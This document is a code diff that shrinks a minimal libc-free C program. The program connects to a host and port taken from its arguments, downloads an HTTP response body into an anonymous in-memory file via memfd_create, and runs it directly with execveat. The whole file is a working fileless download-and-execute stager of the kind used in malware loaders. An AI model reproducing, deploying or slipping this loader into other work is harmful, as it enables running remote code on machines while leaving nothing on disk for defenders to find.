@@ -8,6 +8,8 @@
 
 #define HOST argv[1]
 #define PORT argv[2]
+#define SOCK 3
+#define PAYLOAD 4
 #define GET "GET / HTTP/1.0\r\n\r\n"
 
 static int _atoi(char *a)
@@ -32,28 +34,22 @@ static uint32_t _ipton4(char *ip)
 }
 
 __attribute__((always_inline))
-static inline void main(int argc, char* argv[])
+static inline void main(char* argv[])
 {
-  int sock;
   struct sockaddr_in addr;
-
-  char c;
-  char state;
-
-  int payload;
+  char c, state;
   char buffer[4096];
-  int length;
 
-  sock = syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
+  syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
   addr.sin_family = AF_INET;
   addr.sin_addr.s_addr = _ipton4(HOST);
   addr.sin_port = htons(_atoi(PORT));
-  syscall(SYS_connect, sock, (struct sockaddr *) &addr, sizeof(addr));
+  syscall(SYS_connect, SOCK, (struct sockaddr *) &addr, sizeof(addr));
 
-  syscall(SYS_write, sock, GET, sizeof(GET) - 1);
+  syscall(SYS_write, SOCK, GET, sizeof(GET) - 1);
 
   state = 0;
-  while (syscall(SYS_read, sock, &c, 1)) {
+  while (syscall(SYS_read, SOCK, &c, 1)) {
     if ((state % 2 == 0 && c == '\r') ||
         (state % 2 == 1 && c == '\n'))
       state++;
@@ -63,23 +59,19 @@ static inline void main(int argc, char* argv[])
       break;
   }
 
-  payload = syscall(SYS_memfd_create, "", MFD_CLOEXEC);
+  syscall(SYS_memfd_create, "", MFD_CLOEXEC);
 
-  while (length = syscall(SYS_read, sock, buffer, sizeof(buffer))) {
-    syscall(SYS_write, payload, buffer, length);
-  }
+  while (syscall(SYS_write, PAYLOAD, buffer,
+                 syscall(SYS_read, SOCK, buffer, sizeof(buffer))));
 
-  syscall(SYS_execveat, payload, "", (char *[]){NULL}, (char *[]){NULL}, AT_EMPTY_PATH);
+  syscall(SYS_execveat, PAYLOAD, "", (char *[]){NULL}, (char *[]){NULL}, AT_EMPTY_PATH);
 }
 
-//__attribute__((force_align_arg_pointer))
+// __attribute__((force_align_arg_pointer))
 void _start(int _0, int _1, int _2, int _3, int _4, int _5, char *argv0)
 {
-  int argc;
-  char **argv;
+  // int argc = (int)(long)__builtin_return_address(0);;
+  char **argv = &argv0;
 
-  argc = (int)(long)__builtin_return_address(0);
-  argv = &argv0;
-
-  main(argc, argv);
+  main(argv);
 }
